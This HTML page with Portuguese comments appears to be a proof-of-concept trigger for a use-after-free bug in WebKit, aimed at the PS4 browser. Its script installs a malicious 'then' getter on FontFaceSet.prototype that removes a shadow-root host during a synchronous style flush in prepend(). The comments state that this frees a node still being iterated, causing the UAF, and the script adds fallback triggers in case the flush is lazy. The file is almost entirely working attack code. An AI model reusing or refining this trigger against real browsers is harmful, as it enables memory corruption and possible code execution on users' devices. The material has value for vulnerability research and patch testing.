
<!DOCTYPE html>
<html>
<body>
<script>
// CORRECAO PRINCIPAL:
// No PS4, o flush ocorre DURANTE o shadowRoot.prepend() (eager flush síncrono).
// O getter precisa estar instalado ANTES do prepend, não depois.

document.fonts;

function log(msg) {
    document.body.appendChild(document.createTextNode(msg));
    document.body.appendChild(document.createElement("br"));
}

function run() {
    const host = document.createElement("div");
    document.body.appendChild(host);
    const shadowRoot = host.attachShadow({ mode: "open" });

    // Blob URL: loading state garantido durante toda execucao sincrona
    const fakeOtf = new Uint8Array(500 * 1024);
    for (let i = 0; i < fakeOtf.length; i++) fakeOtf[i] = i & 0xFF;
    const blob = new Blob([fakeOtf], { type: "font/otf" });
    const blobUrl = URL.createObjectURL(blob);

    const fontFaceStyle = document.createElement("style");
    fontFaceStyle.textContent =
        `@font-face { font-family: reentryFont; src: url("${blobUrl}"); }` +
        `.probe { font: 24px reentryFont; }`;
    shadowRoot.appendChild(fontFaceStyle);

    const probe = document.createElement("span");
    probe.className = "probe";
    probe.textContent = "A";
    shadowRoot.appendChild(probe);

    document.body.offsetHeight;
    document.fonts.load("24px reentryFont", "A");
    log("status: " + document.fonts.status);

    // Materializa a promise ANTES do getter (necessario para thenable assimilation)
    document.fonts.ready;

    // ============================================================
    // CORRECAO: instalar getter ANTES do prepend
    // O PS4 faz flush síncrono durante prepend(), o getter
    // precisa estar no lugar quando flushPendingDescendantUpdates()
    // chamar completedLoading() → resolve fonts.ready
    // ============================================================
    let getterCallCount = 0;
    Object.defineProperty(FontFaceSet.prototype, "then", {
        configurable: true,
        get() {
            delete FontFaceSet.prototype.then;
            ++getterCallCount;
            log(">>> GETTER DISPAROU! count=" + getterCallCount);
            // Remove o host: libera o no iterado em m_inDocumentShadowRoots → UAF
            host.remove();
            return undefined;
        }
    });
    log("getter instalado. status=" + document.fonts.status);

    // O prepend agora encontra o getter no lugar
    // No PS4: prepend → flush síncrono → completedLoading → fonts.ready settle
    //         → thenable check em FontFaceSet → getter DISPARA → host.remove()
    const prependedStyle = document.createElement("style");
    prependedStyle.textContent = ".unused { color: red; }";
    shadowRoot.prepend(prependedStyle);  // ← flush acontece AQUI

    log("apos prepend: getter=" + getterCallCount + " status=" + document.fonts.status);

    // Triggers adicionais caso o flush seja lazy no PS4
    if (getterCallCount === 0) {
        document.styleSheets.length;
        log("apos styleSheets.length: getter=" + getterCallCount);
    }
    if (getterCallCount === 0) {
        document.body.offsetHeight;
        log("apos offsetHeight: getter=" + getterCallCount);
    }
    if (getterCallCount === 0) {
        const canvas = document.createElement("canvas");
        canvas.getContext("2d").font = "24px reentryFont";
        canvas.getContext("2d").measureText("A");
        log("apos measureText: getter=" + getterCallCount);
    }

    log("--- RESULTADO ---");
    log("getter total: " + getterCallCount);
    log("status final: " + document.fonts.status);
    log("PASS se nao travou.");
}

window.addEventListener("load", () => setTimeout(run, 0));
</script>
</body>
</html>
